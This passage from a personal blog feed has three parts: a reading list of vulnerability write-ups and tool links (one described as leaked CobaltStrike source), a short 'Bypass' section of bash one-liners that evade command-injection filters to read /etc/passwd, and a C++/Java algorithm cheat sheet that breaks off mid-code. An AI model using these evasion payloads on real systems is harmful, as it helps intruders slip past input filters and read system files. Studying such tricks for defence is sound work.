Attack: Intel Bootguard vulnerability waking from S3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;trmm.net&#x2F;Sleep_attack&#x2F;</span><br><span class="line">利用intel cpu s3特性进行利用</span><br></pre></td></tr></table></figure><p>•How to get root on Ubuntu 20.04 by pretending nobody’s /home</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securitylab.github.com&#x2F;research&#x2F;Ubuntu-gdm3-accountsservice-LPE</span><br><span class="line">ubuntu20.04 提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Exploring the Exploitability of “Bad Neighbor”: The Recent ICMPv6 Vulnerability (CVE-2020-16898)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.zecops.com&#x2F;vulnerabilities&#x2F;exploring-the-exploitability-of-bad-neighbor-the-recent-icmpv6-vulnerability-cve-2020-16898&#x2F;</span><br><span class="line">ICMPv6 (CVE-2020-16898)漏洞分析</span><br></pre></td></tr></table></figure><p>•Intel Coverage Security and Management Engine</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.intel.com&#x2F;content&#x2F;dam&#x2F;www&#x2F;public&#x2F;us&#x2F;en&#x2F;security-advisory&#x2F;documents&#x2F;intel-csme-security-white-paper.pdf</span><br><span class="line">Intel Coverage Security and Management Engine白皮书</span><br></pre></td></tr></table></figure><p>•Windows RpcEptMapper Service Insecure Registry Permissions EoP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;itm4n.github.io&#x2F;windows-registry-rpceptmapper-eop&#x2F;</span><br><span class="line">Windows RpcEptMapper 服务本地提权漏洞分析</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Try to in-place transition during map update</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;v8&#x2F;v8.git&#x2F;+&#x2F;3ba21a17ce2f26b015cc29adc473812247472776%5E%21&#x2F;#F3</span><br><span class="line">CVE-2020-16009: v8 新 0day</span><br></pre></td></tr></table></figure><p>•Actions Speak Browser Than Words (Exploiting n-days for fun and profit)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;L7aiFKDg0Jk</span><br><span class="line">maxpl0it关于IE以及Firefox n day的利用过程分析</span><br></pre></td></tr></table></figure><p>•[JSC] Assert Operation and HostFunction are in JITOperationsList</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WebKit&#x2F;webkit&#x2F;commit&#x2F;2ffeeff4dfb86a74ae695dea8671fccc423559adhttps:&#x2F;&#x2F;trac.webkit.org&#x2F;search?q&#x3D;JIT-caging</span><br><span class="line">webkit中引入了更强的JIT-Caging机制</span><br></pre></td></tr></table></figure><p>•JavaScriptCore Internals Part I: Tracing JavaScript Source to Bytecode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zon8.re&#x2F;posts&#x2F;jsc-internals-part1-tracing-js-source-to-bytecode&#x2F;</span><br><span class="line">JSC 从源码到字节码分析的文章</span><br></pre></td></tr></table></figure><p>•V8: Turbofan fails to deoptimize code after map deprecation, leading to type confusion</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;detail?id&#x3D;2106</span><br><span class="line">v8 issue2106  map deprecation相关漏洞</span><br></pre></td></tr></table></figure><p>•WebAssembly compilation pipeline</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;v8.dev&#x2F;docs&#x2F;wasm-compilation-pipeline</span><br><span class="line">v8中WebAssembly编译过程分析</span><br></pre></td></tr></table></figure><p>•Deep Dive into Site Isolation (Part 1)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;microsoftedge.github.io&#x2F;edgevr&#x2F;posts&#x2F;deep-dive-into-site-isolation-part-1&#x2F;</span><br><span class="line">对chrome中Site Isolation实现的分析</span><br></pre></td></tr></table></figure><p>•[compiler] Fix use of HeapObjectMatcher</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;v8&#x2F;v8&#x2F;commit&#x2F;27900f17b845b8881d8328ef70b1bccba8984bbcv8 cve-2020-16013 commit</span><br></pre></td></tr></table></figure><p>•Firefox Vulnerability Research Part 2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.exodusintel.com&#x2F;2020&#x2F;11&#x2F;10&#x2F;firefox-vulnerability-research-part-2&#x2F;</span><br><span class="line">firfox漏洞研究文章系列第二篇</span><br></pre></td></tr></table></figure><p>•Warp: Improved JS performance in Firefox 83</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;hacks.mozilla.org&#x2F;2020&#x2F;11&#x2F;warp-improved-js-performance-in-firefox-83&#x2F;</span><br><span class="line">Firefox 83 Warp特性大幅提升js的性格</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•CVE-2020-16877: Exploiting Microsoft Store Games</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.ioactive.com&#x2F;2020&#x2F;11&#x2F;cve-2020-16877-exploiting-microsoft.html</span><br><span class="line">漏洞利用Microsoft Store Games</span><br></pre></td></tr></table></figure><p>•DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.redteam-pentesting.de&#x2F;2020&#x2F;websocket-vulnerability-tomcat&#x2F;</span><br><span class="line">TOMCAT CVE-2020-13935 websocket漏洞分析</span><br></pre></td></tr></table></figure><p>•Breaking The Facebook For Android Application</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ash-king.co.uk&#x2F;blog&#x2F;facebook-bug-bounty-09-18</span><br><span class="line">Facebook app漏洞分析</span><br></pre></td></tr></table></figure><p>•Attack of the clones: Git clients remote code execution</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.blazeinfosec.com&#x2F;attack-of-the-clones-github-desktop-remote-code-execution&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;legalhackers.com&#x2F;advisories&#x2F;Git-LFS-RCE-Exploit-CVE-2020-27955.html</span><br><span class="line">git 客户端代码执行漏洞</span><br></pre></td></tr></table></figure><p>•Active SaltStack CVEs Announced</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.saltstack.com&#x2F;blog&#x2F;on-november-3-2020-saltstack-publicly-disclosed-three-new-cves&#x2F;</span><br><span class="line">SaltStack代码执行漏洞CVE-2020-16846分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-16995: Microsoft Azure Network Watcher Linux Extension EoP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.intezer.com&#x2F;blog&#x2F;cloud-security&#x2F;cve-2020-16995-microsoft-azure-network-watcher-linux-extension&#x2F;Microsoft Azure Network Watcher 提权漏洞CVE-2020-16995分析</span><br></pre></td></tr></table></figure><p>•SAD DNS — New Flaws Re-Enable DNS Cache Poisoning Attacks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;thehackernews.com&#x2F;2020&#x2F;11&#x2F;sad-dns-new-flaws-re-enable-dns-cache.htmlCVE-2020-25705 DNS投毒分析</span><br></pre></td></tr></table></figure><p>•apache-openoffice-rce-via-uno-links</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;irsl&#x2F;apache-openoffice-rce-via-uno-links</span><br><span class="line">Apache OpenOffice RCE (CVE-2020-13958) poc</span><br></pre></td></tr></table></figure><p>•Interesting case of SQLi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@mrnikhilsri&#x2F;interesting-case-of-sqli-84cc3f4a5255</span><br><span class="line">SQLi 案例分析</span><br></pre></td></tr></table></figure><p>•Decrypting OpenSSH sessions for fun and profit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;research.nccgroup.com&#x2F;2020&#x2F;11&#x2F;11&#x2F;decrypting-openssh-sessions-for-fun-and-profit&#x2F;</span><br><span class="line">OpenSSH session 解密分析</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•CobaltStrike</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Freakboy&#x2F;CobaltStrike</span><br><span class="line">CobaltStrike 源码泄露</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•Hacking in an epistolary way: implementing kerberoast in pure VBA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;adepts.of0x.cc&#x2F;kerberoast-vba-macro&#x2F;</span><br><span class="line">通过VBA来实现kerberoast</span><br></pre></td></tr></table></figure><p>•Let’s Encrypt issues new Root and Intermediate Certificates</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;scotthelme.co.uk&#x2F;lets-encrypts-new-root-and-intermediate-certificates&#x2F;证书加密分析</span><br></pre></td></tr></table></figure><p>•The Art of the Honeypot Account: Making the Unusual Look Normal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.hub.trimarcsecurity.com&#x2F;post&#x2F;the-art-of-the-honeypot-account-making-the-unusual-look-normal</span><br><span class="line">搭建Honeypot Account的技巧</span><br></pre></td></tr></table></figure><p>•China and Vulnerability Research</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@thegrugq&#x2F;china-and-vulnerability-research-dc617c993c4ehttps:&#x2F;&#x2F;medium.com&#x2F;@thegrugq&#x2F;cyber-security-motivations-guessing-game-cbb404728ec7</span><br><span class="line">中国漏洞研究现状研究</span><br></pre></td></tr></table></figure><p>•The Chromium Projects Quarterly Updates</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.chromium.org&#x2F;Home&#x2F;chromium-security&#x2F;quarterly-updates</span><br><span class="line">谷歌安全团队每季度更新的动态</span><br></pre></td></tr></table></figure><p>•Oops, I missed it again!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;11&#x2F;oops-i-missed-it-again.html</span><br><span class="line">p0发布的关于曾经研究过没发现漏洞，补丁公布后知道漏洞存在的过程</span><br></pre></td></tr></table></figure><p>•Hunting for Malicious Packages on PyPI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;jordan-wright.com&#x2F;blog&#x2F;post&#x2F;2020-11-12-hunting-for-malicious-packages-on-pypi&#x2F;</span><br><span class="line">PyPI 恶意安装包分析</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass &amp; XSS</title>
      <link href="/2020/10/29/Bypass%20the%20WALL/"/>
      <url>/2020/10/29/Bypass%20the%20WALL/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-code blink-slow"></i>hack my life</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><strong>/etc/passwd</strong> </p><hr><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat /e<span class="variable">$&#123;the&#125;</span>tc/<span class="variable">$&#123;game&#125;</span>pas<span class="variable">$&#123;ftw&#125;</span>swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$game]&#125;</span>swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$&#123;game&#125;</span>]&#125;swd</span><br><span class="line">cat /etc/pas<span class="variable">$&#123;the[$&#123;game[$&#123;ftw&#125;</span>]&#125;]&#125;swd</span><br><span class="line">cat /e$()tc/passwd</span><br><span class="line">cat /et$*c/pas<span class="variable">$@swd</span></span><br><span class="line">cat<span class="variable">$the</span> /etc<span class="variable">$game</span>/passwd<span class="variable">$ftw</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt; expalin</span><br><span class="line"></span><br><span class="line">If No Slash</span><br><span class="line">cat $(<span class="built_in">pwd</span> | head -c 1)etc$(<span class="built_in">pwd</span> | head -c 1)passwd</span><br><span class="line">If No space </span><br><span class="line">cat<span class="variable">$IFS</span>/etc/passwd</span><br><span class="line">still detect your string ? try wildcard</span><br><span class="line">cat /e*c/**ssw*</span><br><span class="line"></span><br><span class="line">expalin</span><br></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code library </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Alorithm Cheat Sheet|算法Cheat Sheet</title>
      <link href="/2020/10/27/%E7%AE%97%E6%B3%95%E9%A2%98cheat%20sheet/"/>
      <url>/2020/10/27/%E7%AE%97%E6%B3%95%E9%A2%98cheat%20sheet/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-code blink-slow"></i><em>持续记录</em></p><h1 id="Alorithm-Cheat-Sheet-算法Cheat-Sheet"><a href="#Alorithm-Cheat-Sheet-算法Cheat-Sheet" class="headerlink" title="Alorithm Cheat Sheet|算法Cheat Sheet"></a>Alorithm Cheat Sheet|算法Cheat Sheet</h1><h3 id="技巧-Tricks"><a href="#技巧-Tricks" class="headerlink" title="技巧|Tricks"></a>技巧|Tricks</h3><hr><ul><li><p><code>while(~scanf(&quot;%d&quot;, &amp;n))</code></p><p><code>~</code>是按位取反 <code>scanf</code>的返回值是输入值的个数 如果没有输入值就是返回-1 -1按位取反结果是0,即没有输入的时候退出循环</p></li><li><p><code>INF</code>(最大值)设置</p><p>INF设为0x7fffffff：32-bit int的最大值，但是注意越界操作，且不能满足“无穷大加一个有穷的数依然是无穷大”条件</p><p>INF设为0x3f3f3f3f：多数情况下较为合理，它是很大的数，方便数组清零操作memset(a,0x3f,sizeof(a))，且满<em>足无穷大加无穷大还是无穷大</em>的条件</p></li></ul><h3 id="素数表生成-Prime-number-table"><a href="#素数表生成-Prime-number-table" class="headerlink" title="素数表生成|Prime number table"></a>素数表生成|Prime number table</h3><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createprime</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m = <span class="built_in">sqrt</span>(n + <span class="number">0.5</span>);</span><br><span class="line"><span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="keyword">sizeof</span>(vis));</span><br><span class="line">vis[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= m; i++)</span><br><span class="line">    <span class="keyword">if</span> (!vis[i])</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i*i; j &lt;= n; j += i)</span><br><span class="line">     vis[j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*生成1到n的素数表，里面的循环是把非素数置为1，素数为0,1特殊对待，直接赋值为1，变为非素数*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime_2</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp = <span class="built_in">sqrt</span>(num);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= tmp; i++)</span><br><span class="line"><span class="keyword">if</span> (num %i == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*素数判断，对1特殊对待*/</span></span><br></pre></td></tr></table></figure><h3 id="快速幂-Binary-Exponentiation"><a href="#快速幂-Binary-Exponentiation" class="headerlink" title="快速幂|Binary Exponentiation"></a>快速幂|Binary Exponentiation</h3><hr><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fastPower</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> base = a;</span><br><span class="line"><span class="keyword">while</span> (b != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((b &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123; <span class="comment">//如果当前的次幂数最后一位(二进制数)不为0的话，那么我们将当前权值加入到最后答案里面去</span></span><br><span class="line">ans = ans * base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//权值增加</span></span><br><span class="line">base = base * base;</span><br><span class="line">b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, fastPower(<span class="number">3</span>, <span class="number">11</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*个人解析</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">为什么要快速幂？</span></span><br><span class="line"><span class="comment">更快的算出幂，由于一个指数肯定能够分解成二进制的形式，通过对二进制的最右边一位的判断，1则乘，否则则不乘</span></span><br><span class="line"><span class="comment">可以缩小计算次数，而且由于指数都被分解为2的i次方，所以权值可以通过累乘来记录，比如2^4 2^8 2^16都可以由前者乘以前者来得到。当遇到二进制上的1时候再乘就可以得到正确的答案。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">快速幂是根据指数转为二进制，在二进制遇到1的地方对答案进行累乘，也即是在这个时候相当于乘1，所以基础</span></span><br><span class="line"><span class="comment">权值要不断的乘自己，来保证正确性。</span></span><br><span class="line"><span class="comment">例如3^11</span></span><br><span class="line"><span class="comment">由于任何数的零次方都是1，所以ans一开始为1</span></span><br><span class="line"><span class="comment">3^1*3^2*3^8  1 2 8想到二进制 3的1次方就是基础值乘3 1*3 (3^2=3^1*3^1) (3^4=3^2*3^2) (3^8=3^4*3^4)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">11=1101</span></span><br><span class="line"><span class="comment">分为2^3+2^1+2^0 基础权值为3，一开始0位上有1，所以初始答案1要乘以当前的权值，所以ans*base=3 base为9</span></span><br><span class="line"><span class="comment">这个时候要计算第1位的权值了，，发现此时1位上也为1，所以ans*base=3*9=27 base为81（9*9）</span></span><br><span class="line"><span class="comment">计算第2位，，此时位置上为0，不乘,81*81=6561</span></span><br><span class="line"><span class="comment">最后一位，此时位置上有1,ans*base=27*6561=177147</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="伪丑数-Pseudo-ugly-number"><a href="#伪丑数-Pseudo-ugly-number" class="headerlink" title="伪丑数|Pseudo ugly number"></a>伪丑数|Pseudo ugly number</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> N = <span class="number">5842</span>;<span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span>  [] humble = <span class="keyword">new</span> <span class="keyword">long</span> [N+<span class="number">5</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    static int [] l = new int [N];</span></span><br><span class="line"><span class="comment">//    static int [] r= new int [N];</span></span><br><span class="line"><span class="comment">//    static float per[]=new float [N+1];</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line">        humble[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> p2,p3,p5,p7;</span><br><span class="line">        p2=p3=p5=p7=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=N)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            humble[i]=Math.min(Math.min(humble[p2]*<span class="number">2</span>, humble[p3]*<span class="number">3</span>),Math.min(humble[p5]*<span class="number">5</span>, humble[p7]*<span class="number">7</span>));</span><br><span class="line">            <span class="keyword">if</span>(humble[i]==humble[p2]*<span class="number">2</span>)</span><br><span class="line">                p2++;</span><br><span class="line">            <span class="keyword">if</span>(humble[i]==humble[p3]*<span class="number">3</span>)</span><br><span class="line">                p3++;</span><br><span class="line">            <span class="keyword">if</span>(humble[i]==humble[p5]*<span class="number">5</span>)</span><br><span class="line">                p5++;</span><br><span class="line">            <span class="keyword">if</span>(humble[i]==humble[p7]*<span class="number">7</span>)</span><br><span class="line">                p7++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(in.hasNext())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> n=in.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(n%<span class="number">10</span>==<span class="number">1</span>&amp;&amp;n%<span class="number">100</span>!=<span class="number">11</span>)</span><br><span class="line">                    System.out.println(<span class="string">"The "</span>+n+<span class="string">"st humble number is "</span>+humble[n]+<span class="string">"."</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">10</span>==<span class="number">2</span>&amp;&amp;n%<span class="number">100</span>!=<span class="number">12</span>)</span><br><span class="line">                    System.out.println(<span class="string">"The "</span>+n+<span class="string">"nd humble number is "</span>+humble[n]+<span class="string">"."</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(n%<span class="number">10</span>==<span class="number">3</span>&amp;&amp;n%<span class="number">100</span>!=<span class="number">13</span>)</span><br><span class="line">                    System.out.println(<span class="string">"The "</span>+n+<span class="string">"rd humble number is "</span>+humble[n]+<span class="string">"."</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    System.out.println(<span class="string">"The "</span>+n+<span class="string">"th humble number is 